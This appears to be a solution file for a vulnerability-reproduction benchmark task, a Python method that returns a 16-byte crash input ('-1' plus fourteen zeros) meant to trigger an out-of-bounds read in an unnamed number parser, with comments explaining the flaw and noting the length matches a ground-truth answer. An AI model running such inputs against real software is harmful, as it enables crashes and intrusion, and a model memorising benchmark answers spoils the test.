import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is an out-of-bounds read in the number parser,
        # caused by an incorrect pointer advancement when a leading minus
        # sign is encountered. The parser advances past the '-', then calls
        # a function to parse the number. This function, when scanning for the
        # end of the number, can read past the end of the input buffer if the
        # buffer ends with a sequence of digits.
        #
        # A 16-byte PoC can be constructed to exploit this. It needs to start
        # with a '-' and be followed by 15 characters that are part of a valid
        # number. A non-zero digit after the '-' is chosen to avoid special
        # handling for numbers starting with '0'.
        #
        # PoC structure: '-' (1 byte) + '1' (1 byte) + '0' * 14 (14 bytes)
        # Total length is 16 bytes, matching the ground-truth length.
        # This will cause the parser to attempt to read the 17th byte,
        # resulting in a crash.
        poc = b'-1' + b'0' * 14
        return poc